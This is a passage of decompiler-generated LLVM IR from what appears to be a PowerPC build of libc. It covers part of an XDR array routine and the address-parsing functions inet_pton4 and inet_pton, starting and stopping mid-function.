  %v1_10016208 = inttoptr i32 %v0_10016208 to i32*
  %v2_10016208 = load i32, i32* %v1_10016208, align 4
  %v3_1001620c = icmp eq i32 %v2_10016208, 1
  br i1 %v3_1001620c, label %dec_label_pc_10016220, label %dec_label_pc_10016214

dec_label_pc_10016214:                            ; preds = %dec_label_pc_10016208
  %v3_10016214 = icmp eq i32 %v2_10016208, 2
  br i1 %v3_10016214, label %dec_label_pc_100162d0, label %dec_label_pc_10016268

dec_label_pc_10016220:                            ; preds = %dec_label_pc_10016208
  %v3_10016220 = icmp eq i32 %v2_100161d8, 0
  br i1 %v3_10016220, label %dec_label_pc_100162d0, label %dec_label_pc_10016228

dec_label_pc_10016228:                            ; preds = %dec_label_pc_10016220
  %v1_10016228 = load i32, i32* %r25.global-to-local, align 4
  %v2_10016228 = mul i32 %v1_10016228, %v2_100161d8
  store i32 %v2_10016228, i32* @r30, align 4
  store i32 %v2_10016228, i32* @r3, align 4
  store i32 268526132, i32* @lr, align 4
  %v0_10016230 = call i32 @malloc()
  store i32 %v0_10016230, i32* %r3.global-to-local, align 4
  %v3_10016234 = icmp eq i32 %v0_10016230, 0
  store i32 %v0_10016230, i32* @r31, align 4
  %v1_1001623c = load i32, i32* @r26, align 4
  %v2_1001623c = inttoptr i32 %v1_1001623c to i32*
  store i32 %v0_10016230, i32* %v2_1001623c, align 4
  br i1 %v3_10016234, label %dec_label_pc_10016244, label %dec_label_pc_1001625c

dec_label_pc_10016244:                            ; preds = %dec_label_pc_10016228
  %v3_1001624c = load i32, i32* @global_var_1002ef8c, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_1001a190.598 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016258.599 to i32), i32* @lr, align 4
  %v4_10016254 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1001a190.598 to i32), i32 %v3_1001624c, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v4_10016254, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100162c8

dec_label_pc_1001625c:                            ; preds = %dec_label_pc_10016228
  %v0_1001625c = load i32, i32* @r30, align 4
  store i32 268526184, i32* @lr, align 4
  %v3_10016264 = call i32 @__GI_memset(i32 0, i32 %v0_1001625c, i32 %v0_1001625c)
  store i32 %v3_10016264, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016268

dec_label_pc_10016268:                            ; preds = %dec_label_pc_10016214, %dec_label_pc_10016200, %dec_label_pc_1001625c
  br label %dec_label_pc_10016284

dec_label_pc_10016274:                            ; preds = %dec_label_pc_10016284
  %v0_10016274 = load i32, i32* %r24.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10016274)
  %v0_10016280 = load i32, i32* %r3.global-to-local, align 4
  %v0_10016284.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10016284

dec_label_pc_10016284:                            ; preds = %dec_label_pc_10016268, %dec_label_pc_10016274
  %v0_1001629c = phi i32 [ 0, %dec_label_pc_10016268 ], [ %v0_10016284.pre, %dec_label_pc_10016274 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10016268 ], [ %v0_10016280, %dec_label_pc_10016274 ]
  store i32 %storemerge, i32* @r30, align 4
  %v1_10016284 = load i32, i32* @r29, align 4
  %v0_10016288 = load i32, i32* @r31, align 4
  %v0_1001628c = load i32, i32* @r27, align 4
  store i32 %v0_1001628c, i32* %r3.global-to-local, align 4
  %v3_10016294 = icmp eq i32 %storemerge, 0
  %v1_10016298 = load i32, i32* %r25.global-to-local, align 4
  %v2_10016298 = add i32 %v1_10016298, %v0_10016288
  store i32 %v2_10016298, i32* @r31, align 4
  %v1_1001629c = add i32 %v0_1001629c, 1
  store i32 %v1_1001629c, i32* @r28, align 4
  %.not = icmp uge i32 %v0_1001629c, %v1_10016284
  %brmerge = or i1 %v3_10016294, %.not
  br i1 %brmerge, label %dec_label_pc_100162a8, label %dec_label_pc_10016274

dec_label_pc_100162a8:                            ; preds = %dec_label_pc_10016284
  %v1_100162a8 = inttoptr i32 %v0_1001628c to i32*
  %v2_100162a8 = load i32, i32* %v1_100162a8, align 4
  %v3_100162ac = icmp eq i32 %v2_100162a8, 2
  br i1 %v3_100162ac, label %dec_label_pc_100162b4, label %dec_label_pc_100162d4

dec_label_pc_100162b4:                            ; preds = %dec_label_pc_100162a8
  %v0_100162b4 = load i32, i32* @r26, align 4
  %v1_100162b4 = inttoptr i32 %v0_100162b4 to i32*
  %v2_100162b4 = load i32, i32* %v1_100162b4, align 4
  store i32 %v2_100162b4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100162bc.600 to i32), i32* @lr, align 4
  %v0_100162b8 = call i32 @free()
  store i32 %v0_100162b8, i32* %r3.global-to-local, align 4
  %v1_100162c0 = load i32, i32* @r26, align 4
  %v2_100162c0 = inttoptr i32 %v1_100162c0 to i32*
  store i32 0, i32* %v2_100162c0, align 4
  %v0_100162d8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100162d4

dec_label_pc_100162c8:                            ; preds = %dec_label_pc_100161f4, %entry, %dec_label_pc_10016244
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_100162d4

dec_label_pc_100162d0:                            ; preds = %dec_label_pc_10016214, %dec_label_pc_10016220
  store i32 1, i32* @r30, align 4
  br label %dec_label_pc_100162d4

dec_label_pc_100162d4:                            ; preds = %dec_label_pc_100162a8, %dec_label_pc_100162c8, %dec_label_pc_100162b4, %dec_label_pc_100162d0
  %v0_100162d8 = phi i32 [ %storemerge, %dec_label_pc_100162a8 ], [ 0, %dec_label_pc_100162c8 ], [ %v0_100162d8.pre, %dec_label_pc_100162b4 ], [ 1, %dec_label_pc_100162d0 ]
  store i32 %v0_100162d8, i32* %r3.global-to-local, align 4
  ret i32 %v0_100162d8

; uselistorder directives
  uselistorder i32 %v0_100162d8, { 1, 0 }
  uselistorder i32 %v0_10016230, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32*, i32*)* @xdr_u_int, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100162d4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100162d0, { 1, 0 }
  uselistorder label %dec_label_pc_100162c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10016284, { 1, 0 }
  uselistorder label %dec_label_pc_10016268, { 2, 0, 1 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100162ec = load i32, i32* @lr, align 4
  store i32 %v0_100162ec, i32* %r0.global-to-local, align 4
  %v0_100162f4 = call i32 @__asm_mfcr()
  store i32 %v0_100162f4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  %v2_10016300 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10016300, i32* %r7.global-to-local, align 4
  %v0_10016304 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1001636c

dec_label_pc_1001631c:                            ; preds = %dec_label_pc_1001636c
  %v3_1001631c = icmp eq i32 %v0_10016390, 4
  store i1 %v3_1001631c, i1* %cr7_eq.global-to-local, align 1
  %v0_10016320 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10016320, label %dec_label_pc_10016358, label %dec_label_pc_10016324

dec_label_pc_10016324:                            ; preds = %dec_label_pc_1001631c
  %v0_10016324 = load i32, i32* %r7.global-to-local, align 4
  %v1_10016324 = inttoptr i32 %v0_10016324 to i8*
  %v2_10016324 = load i8, i8* %v1_10016324, align 1
  %v3_10016324 = zext i8 %v2_10016324 to i32
  %v1_10016328 = mul nuw nsw i32 %v3_10016324, 10
  %v1_1001632c = load i32, i32* %r11.global-to-local, align 4
  %v2_1001632c = add i32 %v1_10016328, %v1_1001632c
  %v1_10016330 = add i32 %v2_1001632c, -48
  store i32 %v1_10016330, i32* %r0.global-to-local, align 4
  %v2_10016334 = icmp ugt i32 %v1_10016330, 255
  %v3_10016334 = icmp eq i32 %v1_10016330, 255
  store i1 %v3_10016334, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10016334, label %dec_label_pc_100163b4, label %dec_label_pc_1001633c

dec_label_pc_1001633c:                            ; preds = %dec_label_pc_10016324
  %v1_1001633c = trunc i32 %v1_10016330 to i8
  store i8 %v1_1001633c, i8* %v1_10016324, align 1
  %v0_10016340 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10016340, label %dec_label_pc_10016344, label %dec_label_pc_1001636c.backedge

dec_label_pc_10016344:                            ; preds = %dec_label_pc_1001633c
  %v0_10016344 = load i32, i32* @r10, align 4
  %v1_10016344 = add i32 %v0_10016344, 1
  store i32 %v1_10016344, i32* @r10, align 4
  store i32 1, i32* @r8, align 4
  %v2_1001634c = icmp sgt i32 %v1_10016344, 4
  %v3_1001634c = icmp eq i32 %v1_10016344, 4
  store i1 %v3_1001634c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001634c, label %dec_label_pc_100163b4, label %dec_label_pc_1001636c.backedge

dec_label_pc_10016358:                            ; preds = %dec_label_pc_1001631c
  store i32 0, i32* @r8, align 4
  %v0_1001635c = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_1001635c.not = xor i1 %v0_1001635c, true
  %v0_10016360 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1001631c, %v0_10016360
  %or.cond = or i1 %brmerge, %v0_1001635c.not
  br i1 %or.cond, label %dec_label_pc_100163b4, label %dec_label_pc_10016368

dec_label_pc_10016368:                            ; preds = %dec_label_pc_10016358
  %v0_10016368 = load i32, i32* %r6.global-to-local, align 4
  %v1_10016368 = trunc i32 %v0_10016368 to i8
  %v2_10016368 = load i32, i32* %r7.global-to-local, align 4
  %v3_10016368 = add i32 %v2_10016368, 1
  %v4_10016368 = inttoptr i32 %v3_10016368 to i8*
  store i8 %v1_10016368, i8* %v4_10016368, align 1
  store i32 %v3_10016368, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1001636c.backedge

dec_label_pc_1001636c.backedge:                   ; preds = %dec_label_pc_10016368, %dec_label_pc_1001633c, %dec_label_pc_10016344
  %v0_1001636c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10016370.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001636c

dec_label_pc_1001636c:                            ; preds = %dec_label_pc_1001636c.backedge, %entry
  %v0_10016370 = phi i32 [ %v0_10016370.pre, %dec_label_pc_1001636c.backedge ], [ 0, %entry ]
  %v0_10016374 = phi i32 [ %v0_1001636c.pre, %dec_label_pc_1001636c.backedge ], [ %v0_100162f4, %entry ]
  %v1_1001636c = inttoptr i32 %v0_10016374 to i8*
  %v2_1001636c = load i8, i8* %v1_1001636c, align 1
  %v3_1001636c = zext i8 %v2_1001636c to i32
  store i32 %v3_1001636c, i32* %r11.global-to-local, align 4
  %v3_10016370 = icmp eq i32 %v0_10016370, 0
  store i1 %v3_10016370, i1* %cr4_eq.global-to-local, align 1
  %v1_10016374 = add i32 %v0_10016374, 1
  store i32 %v1_10016374, i32* %r3.global-to-local, align 4
  %v3_10016378 = icmp eq i8 %v2_1001636c, 0
  store i1 %v3_10016378, i1* %cr7_eq.global-to-local, align 1
  %v1_1001637c = add nsw i32 %v3_1001636c, -48
  store i32 %v1_1001637c, i32* %r0.global-to-local, align 4
  %v2_10016380 = icmp ugt i32 %v1_1001637c, 9
  store i1 %v2_10016380, i1* %cr6_gt.global-to-local, align 1
  %v3_10016384 = icmp eq i8 %v2_1001636c, 46
  store i1 %v3_10016384, i1* %cr1_eq.global-to-local, align 1
  %v0_10016388 = load i4, i4* @cr4, align 1
  %v1_10016388 = call %3 @__asm_mcrf_cr0_write(i4 %v0_10016388)
  %v4_10016388 = extractvalue %3 %v1_10016388, 2
  store i1 %v4_10016388, i1* %cr0_eq.global-to-local, align 1
  %v0_1001638c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_10016390 = load i32, i32* @r10, align 4
  br i1 %v0_1001638c, label %dec_label_pc_10016390, label %dec_label_pc_1001631c

dec_label_pc_10016390:                            ; preds = %dec_label_pc_1001636c
  %v3_10016390 = icmp eq i32 %v0_10016390, 3
  store i1 %v3_10016390, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_10016390, 4
  br i1 %tmp9, label %dec_label_pc_100163b4, label %dec_label_pc_10016398

dec_label_pc_10016398:                            ; preds = %dec_label_pc_10016390
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_10016300, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100163a8.601 to i32), i32* @lr, align 4
  %v0_100163a4 = call i32 @memcpy()
  br label %dec_label_pc_100163b4

dec_label_pc_100163b4:                            ; preds = %dec_label_pc_10016358, %dec_label_pc_10016324, %dec_label_pc_10016344, %dec_label_pc_10016390, %dec_label_pc_10016398
  %storemerge = phi i32 [ 1, %dec_label_pc_10016398 ], [ 0, %dec_label_pc_10016390 ], [ 0, %dec_label_pc_10016344 ], [ 0, %dec_label_pc_10016324 ], [ 0, %dec_label_pc_10016358 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_10016304, i32* %r0.global-to-local, align 4
  %v1_100163c4 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100162f4)
  %v4_100163c4 = extractvalue %0 %v1_100163c4, 2
  store i1 %v4_100163c4, i1* %cr0_eq.global-to-local, align 1
  %v9_100163c4 = extractvalue %0 %v1_100163c4, 7
  store i4 %v9_100163c4, i4* @cr4, align 1
  %v0_100163c8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100163c8

; uselistorder directives
  uselistorder i32 %v1_10016344, { 1, 0, 2 }
  uselistorder i32 %v1_10016330, { 0, 2, 1, 3 }
  uselistorder i32 %v0_100162f4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 3, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 13, 14, 6, 15, 7, 8, 0, 10, 9, 1, 11, 12, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_100163b4, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1001636c.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_100163cc = icmp eq i32 %arg1, 2
  %v0_100163d0 = load i32, i32* @lr, align 4
  store i32 %v0_100163d0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_100163cc, label %dec_label_pc_100163f8, label %dec_label_pc_100163ec

dec_label_pc_100163ec:                            ; preds = %entry
  %v3_100163ec = icmp eq i32 %arg1, 10
  br i1 %v3_100163ec, label %dec_label_pc_1001640c, label %dec_label_pc_100165a8

dec_label_pc_100163f8:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268526596, i32* @lr, align 4
  %v3_10016400 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_10016400, i32* %r3.global-to-local, align 4
  store i32 %v3_10016400, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100165c0

dec_label_pc_1001640c:                            ; preds = %dec_label_pc_100163ec
  %v2_1001640c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001640c, i32* %r3.global-to-local, align 4
  store i32 268526620, i32* @lr, align 4
  %v3_10016418 = call i32 @__GI_memset(i32 %v2_1001640c, i32 0, i32 16)
  store i32 %v3_10016418, i32* %r3.global-to-local, align 4
  %v0_1001641c = load i32, i32* @r29, align 4
  %v1_1001641c = inttoptr i32 %v0_1001641c to i8*
  %v2_1001641c = load i8, i8* %v1_1001641c, align 1
  %v3_1001641c = zext i8 %v2_1001641c to i32
  store i32 %v3_1001641c, i32* %r0.global-to-local, align 4
  store i32 %v3_10016418, i32* @r31, align 4
  %v2_10016424 = add i32 %v3_10016418, 16
  store i32 %v2_10016424, i32* @r27, align 4
  %v3_10016428 = icmp eq i8 %v2_1001641c, 58
  br i1 %v3_10016428, label %dec_label_pc_10016430, label %dec_label_pc_1001643c

dec_label_pc_10016430:                            ; preds = %dec_label_pc_1001640c
  %v1_10016430 = add i32 %v0_1001641c, 1
  %v2_10016430 = inttoptr i32 %v1_10016430 to i8*
  %v3_10016430 = load i8, i8* %v2_10016430, align 1
  %v4_10016430 = zext i8 %v3_10016430 to i32
  store i32 %v4_10016430, i32* %r0.global-to-local, align 4
  store i32 %v1_10016430, i32* @r29, align 4
  %v3_10016434 = icmp eq i8 %v3_10016430, 58
  br i1 %v3_10016434, label %dec_label_pc_1001643c, label %dec_label_pc_100165bc

dec_label_pc_1001643c:                            ; preds = %dec_label_pc_10016430, %dec_label_pc_1001640c
  %v0_1001643c = phi i32 [ %v1_10016430, %dec_label_pc_10016430 ], [ %v0_1001641c, %dec_label_pc_1001640c ]
  store i32 %v0_1001643c, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_100165103036 = inttoptr i32 %v0_1001643c to i8*
  %v2_100165103137 = load i8, i8* %v1_100165103036, align 1
  %v3_100165103238 = zext i8 %v2_100165103137 to i32
  store i32 %v3_100165103238, i32* %r3.global-to-local, align 4
  store i32 268526872, i32* @lr, align 4
  %v1_100165143339 = call i32 @__GI_tolower(i32 %v3_100165103238)
  store i32 %v1_100165143339, i32* %r3.global-to-local, align 4
  store i32 %v1_100165143339, i32* @r30, align 4
  %v3_100165183440 = icmp eq i32 %v1_100165143339, 0
  br i1 %v3_100165183440, label %dec_label_pc_10016520, label %dec_label_pc_10016448.lr.ph

dec_label_pc_10016448:                            ; preds = %dec_label_pc_10016448.lr.ph, %dec_label_pc_10016510.backedge
  %v1_1001651435 = phi i32 [ %v1_100165143341, %dec_label_pc_10016448.lr.ph ], [ %v1_10016514, %dec_label_pc_10016510.backedge ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001a1c0.602 to i32), i32* @r25, align 4
  %v0_10016454 = load i32, i32* @r29, align 4
  %v1_10016454 = add i32 %v0_10016454, 1
  store i32 %v1_10016454, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1001a1c0.602 to i32), i32* @r3, align 4
  store i32 268526688, i32* @lr, align 4
  %v3_1001645c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1001a1c0.602 to i32), i32 %v1_1001651435)
  store i32 %v3_1001645c, i32* %r3.global-to-local, align 4
  %v3_10016460 = icmp eq i32 %v3_1001645c, 0
  br i1 %v3_10016460, label %dec_label_pc_10016480, label %dec_label_pc_10016468

dec_label_pc_10016468:                            ; preds = %dec_label_pc_10016448
  %v0_10016468 = load i32, i32* @r25, align 4
  %v2_10016468 = sub i32 %v3_1001645c, %v0_10016468
  store i32 %v2_10016468, i32* %r0.global-to-local, align 4
  %v0_1001646c = load i32, i32* @r28, align 4
  %v1_1001646c = mul i32 %v0_1001646c, 16
  store i32 %v1_1001646c, i32* %r9.global-to-local, align 4
  %v2_10016470 = or i32 %v1_1001646c, %v2_10016468
  store i32 %v2_10016470, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_10016470, 65536
  br i1 %tmp19, label %dec_label_pc_1001650c, label %dec_label_pc_100165bc

dec_label_pc_10016480:                            ; preds = %dec_label_pc_10016448
  %v0_10016480 = load i32, i32* @r30, align 4
  %v3_10016480 = icmp eq i32 %v0_10016480, 58
  br i1 %v3_10016480, label %dec_label_pc_10016488, label %dec_label_pc_100164dc

dec_label_pc_10016488:                            ; preds = %dec_label_pc_10016480
  %v0_10016488 = load i32, i32* @r23, align 4
  %v3_10016488 = icmp eq i32 %v0_10016488, 0
  br i1 %v3_10016488, label %dec_label_pc_10016490, label %dec_label_pc_100164a4

dec_label_pc_10016490:                            ; preds = %dec_label_pc_10016488
  %v0_10016490 = load i32, i32* @r24, align 4
  %v3_10016490 = icmp eq i32 %v0_10016490, 0
  br i1 %v3_10016490, label %dec_label_pc_10016498, label %dec_label_pc_100165bc

dec_label_pc_10016498:                            ; preds = %dec_label_pc_10016490
  %v0_10016498 = load i32, i32* @r31, align 4
  store i32 %v0_10016498, i32* @r24, align 4
  %v0_1001649c = load i32, i32* @r29, align 4
  store i32 %v0_1001649c, i32* @r26, align 4
  br label %dec_label_pc_10016510.backedge

dec_label_pc_100164a4:                            ; preds = %dec_label_pc_10016488
  %v0_100164a4 = load i32, i32* @r29, align 4
  %v1_100164a4 = inttoptr i32 %v0_100164a4 to i8*
  %v2_100164a4 = load i8, i8* %v1_100164a4, align 1
  %v3_100164a4 = zext i8 %v2_100164a4 to i32
  store i32 %v3_100164a4, i32* %r0.global-to-local, align 4
  %v3_100164a8 = icmp eq i8 %v2_100164a4, 0
  br i1 %v3_100164a8, label %dec_label_pc_100165bc, label %dec_label_pc_100164b0

dec_label_pc_100164b0:                            ; preds = %dec_label_pc_100164a4
  %v0_100164b0 = load i32, i32* @r31, align 4
  %v1_100164b0 = add i32 %v0_100164b0, 2
  store i32 %v1_100164b0, i32* %r0.global-to-local, align 4
  %v1_100164b4 = load i32, i32* @r27, align 4
  %v3_100164b4 = icmp ugt i32 %v1_100164b0, %v1_100164b4
  br i1 %v3_100164b4, label %dec_label_pc_100165bc, label %dec_label_pc_100164bc

dec_label_pc_100164bc:                            ; preds = %dec_label_pc_100164b0
  %v0_100164bc = load i32, i32* @r28, align 4
  %v1_100164bc = udiv i32 %v0_100164bc, 256
  store i32 %v1_100164bc, i32* %r0.global-to-local, align 4
  %v1_100164c0 = trunc i32 %v0_100164bc to i8
  %v3_100164c0 = add i32 %v0_100164b0, 1
  %v4_100164c0 = inttoptr i32 %v3_100164c0 to i8*
  store i8 %v1_100164c0, i8* %v4_100164c0, align 1
  %v0_100164c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100164c4 = trunc i32 %v0_100164c4 to i8
  %v2_100164c4 = load i32, i32* @r31, align 4
  %v3_100164c4 = inttoptr i32 %v2_100164c4 to i8*
  store i8 %v1_100164c4, i8* %v3_100164c4, align 1
  %v0_100164c8 = load i32, i32* @r29, align 4
  store i32 %v0_100164c8, i32* @r26, align 4
  %v0_100164cc = load i32, i32* @r31, align 4
  %v1_100164cc = add i32 %v0_100164cc, 2
  store i32 %v1_100164cc, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001651030 = inttoptr i32 %v0_100164c8 to i8*
  %v2_1001651031 = load i8, i8* %v1_1001651030, align 1
  %v3_1001651032 = zext i8 %v2_1001651031 to i32
  store i32 %v3_1001651032, i32* %r3.global-to-local, align 4
  store i32 268526872, i32* @lr, align 4
  %v1_1001651433 = call i32 @__GI_tolower(i32 %v3_1001651032)
  store i32 %v1_1001651433, i32* %r3.global-to-local, align 4
  store i32 %v1_1001651433, i32* @r30, align 4
  %v3_1001651834 = icmp eq i32 %v1_1001651433, 0
  br i1 %v3_1001651834, label %dec_label_pc_10016520, label %dec_label_pc_10016448.lr.ph

dec_label_pc_10016448.lr.ph:                      ; preds = %dec_label_pc_1001643c, %dec_label_pc_100164bc
  %v1_100165143341 = phi i32 [ %v1_1001651433, %dec_label_pc_100164bc ], [ %v1_100165143339, %dec_label_pc_1001643c ]
  br label %dec_label_pc_10016448

dec_label_pc_100164dc:                            ; preds = %dec_label_pc_10016480
  %v3_100164dc = icmp eq i32 %v0_10016480, 46
  br i1 %v3_100164dc, label %dec_label_pc_100164e4, label %dec_label_pc_100165bc

dec_label_pc_100164e4:                            ; preds = %dec_label_pc_100164dc
  %v0_100164e4 = load i32, i32* @r31, align 4
  %v1_100164e4 = add i32 %v0_100164e4, 4
  store i32 %v1_100164e4, i32* @r30, align 4
  %v1_100164e8 = load i32, i32* @r27, align 4
  %v3_100164e8 = icmp ugt i32 %v1_100164e4, %v1_100164e8
  br i1 %v3_100164e8, label %dec_label_pc_100165bc, label %dec_label_pc_100164f0

dec_label_pc_100164f0:                            ; preds = %dec_label_pc_100164e4
  %v0_100164f4 = load i32, i32* @r26, align 4
  store i32 %v0_100164f4, i32* %r3.global-to-local, align 4
  store i32 268526844, i32* @lr, align 4
  %v3_100164f8 = call i32 @inet_pton4(i32 %v0_100164f4, i32 %v0_100164e4)
  store i32 %v3_100164f8, i32* %r3.global-to-local, align 4
  %v0_100164fc = load i32, i32* @r30, align 4
  store i32 %v0_100164fc, i32* @r31, align 4
  %v2_10016500 = icmp sgt i32 %v3_100164f8, 0
  br i1 %v2_10016500, label %dec_label_pc_10016544, label %dec_label_pc_100165bc

dec_label_pc_1001650c:                            ; preds = %dec_label_pc_10016468
  store i32 1, i32* @r23, align 4
  %v0_10016510.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10016510.backedge

dec_label_pc_10016510.backedge:                   ; preds = %dec_label_pc_1001650c, %dec_label_pc_10016498
  %v0_10016510.be = phi i32 [ %v0_10016510.pre.pre, %dec_label_pc_1001650c ], [ %v0_1001649c, %dec_label_pc_10016498 ]
  %v1_10016510 = inttoptr i32 %v0_10016510.be to i8*
  %v2_10016510 = load i8, i8* %v1_10016510, align 1
  %v3_10016510 = zext i8 %v2_10016510 to i32
  store i32 %v3_10016510, i32* %r3.global-to-local, align 4
  store i32 268526872, i32* @lr, align 4
  %v1_10016514 = call i32 @__GI_tolower(i32 %v3_10016510)
  store i32 %v1_10016514, i32* %r3.global-to-local, align 4
  store i32 %v1_10016514, i32* @r30, align 4
  %v3_10016518 = icmp eq i32 %v1_10016514, 0
  br i1 %v3_10016518, label %dec_label_pc_10016520, label %dec_label_pc_10016448

dec_label_pc_10016520:                            ; preds = %dec_label_pc_10016510.backedge, %dec_label_pc_1001643c, %dec_label_pc_100164bc
  %v0_10016520 = load i32, i32* @r23, align 4
  %v3_10016520 = icmp eq i32 %v0_10016520, 0
  %v0_10016588.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_10016520, label %dec_label_pc_10016544, label %dec_label_pc_10016528

dec_label_pc_10016528:                            ; preds = %dec_label_pc_10016520
  %v1_10016528 = add i32 %v0_10016588.pre.pre, 2
  store i32 %v1_10016528, i32* %r0.global-to-local, align 4
  %v1_1001652c = load i32, i32* @r27, align 4
  %v3_1001652c = icmp ugt i32 %v1_10016528, %v1_1001652c
  br i1 %v3_1001652c, label %dec_label_pc_100165bc, label %dec_label_pc_10016534

dec_label_pc_10016534:                            ; preds = %dec_label_pc_10016528
  %v0_10016534 = load i32, i32* @r28, align 4
  %v1_10016534 = udiv i32 %v0_10016534, 256
  store i32 %v1_10016534, i32* %r0.global-to-local, align 4
  %v1_10016538 = trunc i32 %v0_10016534 to i8
  %v3_10016538 = add i32 %v0_10016588.pre.pre, 1
  %v4_10016538 = inttoptr i32 %v3_10016538 to i8*
  store i8 %v1_10016538, i8* %v4_10016538, align 1
  %v0_1001653c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001653c = trunc i32 %v0_1001653c to i8
  %v2_1001653c = load i32, i32* @r31, align 4
  %v3_1001653c = inttoptr i32 %v2_1001653c to i8*
  store i8 %v1_1001653c, i8* %v3_1001653c, align 1
  %v0_10016540 = load i32, i32* @r31, align 4
  %v1_10016540 = add i32 %v0_10016540, 2
  store i32 %v1_10016540, i32* @r31, align 4
  br label %dec_label_pc_10016544

dec_label_pc_10016544:                            ; preds = %dec_label_pc_10016520, %dec_label_pc_100164f0, %dec_label_pc_10016534
  %v0_10016588.pre = phi i32 [ %v0_100164fc, %dec_label_pc_100164f0 ], [ %v1_10016540, %dec_label_pc_10016534 ], [ %v0_10016588.pre.pre, %dec_label_pc_10016520 ]
  %v0_10016544 = load i32, i32* @r24, align 4
  %v3_10016544 = icmp eq i32 %v0_10016544, 0
  %v1_10016588.pre = load i32, i32* @r27, align 4
  %v4_10016588 = icmp eq i32 %v0_10016588.pre, %v1_10016588.pre
  br i1 %v3_10016544, label %dec_label_pc_10016588, label %dec_label_pc_1001654c

dec_label_pc_1001654c:                            ; preds = %dec_label_pc_10016544
